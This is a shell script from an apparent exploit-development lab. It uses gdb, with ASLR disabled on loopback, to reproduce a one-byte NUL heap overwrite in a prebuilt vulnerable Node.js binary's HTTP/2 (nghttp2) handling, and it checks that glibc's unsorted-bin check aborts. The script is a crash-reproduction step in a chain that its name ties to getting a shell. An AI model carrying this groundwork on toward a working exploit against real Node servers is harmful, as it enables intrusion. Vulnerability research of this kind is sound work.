#!/bin/sh
# node2shell shrinkwalk — debugger walk of the corrupted unsorted-bin
# state at nghttp2_submit_altsvc entry (post-write, pre-abort), then the
# SIGABRT backtrace. Proves the one-byte NUL zeroes the victim's
# size-field LSB byte (shrinking the size magnitude when the low byte
# carries it) and that glibc 2.39's unsorted validator fires on the
# next malloc inside the same request.
#
# Usage: sh lab/repro/node2shell-shrinkwalk/run.sh [port]
#   NB env override (default lab/node2shell/bin/node-v24.22.2-linux-x64/bin/node).
# Loopback only; ASLR off via setarch -R.
set -u
HERE=$(cd "$(dirname "$0")" && pwd)
ROOT=$(cd "$HERE/../../.." && pwd)
NB=${NB:-$ROOT/lab/node2shell/bin/node-v24.22.2-linux-x64/bin/node}
PORT=${1:-31921}
[ -x "$NB" ] || { echo "vulnerable prebuilt absent: $NB"; exit 1; }

{
  echo "set pagination off"
  echo "source $HERE/walk.py"
  echo "set confirm off"
  echo "break nghttp2_submit_altsvc"
  echo "commands"
  echo "silent"
  echo "python walk_unsorted()"
  echo "continue"
  echo "end"
  echo "run lab/repro/node2shell-rung1-server.js $PORT"
  echo "bt 12"
  echo "quit"
} > "$HERE/gs.gdb"

( for i in $(seq 1 300); do "$NB" "$HERE/retry-client.js" "$PORT" 1040 >/dev/null 2>&1 && break; sleep 0.2; done ) &
CPID=$!
timeout 75 setarch -R gdb -q -batch -x "$HERE/gs.gdb" --args "$NB" > "$HERE/walk.log" 2>&1
rc=$?
kill $CPID 2>/dev/null
echo "gdb rc=$rc"
awk '/ORIGIN ptr/{f=1} f' "$HERE/walk.log" | head -60
grep -q 'SIGABRT' "$HERE/walk.log" && echo "SHRINKWALK-RESULT: abort reproduced, victim shrunk" \
  || echo "SHRINKWALK-RESULT: no abort in this gdb env — layout shifted, retry"
